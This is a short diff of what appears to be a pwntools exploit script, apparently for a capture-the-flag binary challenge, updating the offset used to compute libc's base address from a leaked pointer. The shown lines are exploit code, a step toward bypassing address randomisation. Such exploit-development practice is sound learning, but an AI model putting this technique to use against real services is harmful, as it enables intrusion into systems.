@@ -18,12 +18,12 @@ for i in range(9):
     print("drop", c.recvline())
 
 """
-0x007ffff7df30b3-0x007ffff7dcc000
-$1 = 0x270b3
+p 0x7f68fcb21083-0x00007f68fcafd000
+$1 = 0x24083
 """
 
 addr = c.recvline().split()[-1]
-libc_addr = int(addr, 16) - 0x270b3
+libc_addr = int(addr, 16) - 0x24083
 print(hex(libc_addr))
 
 c.recvuntil("End")
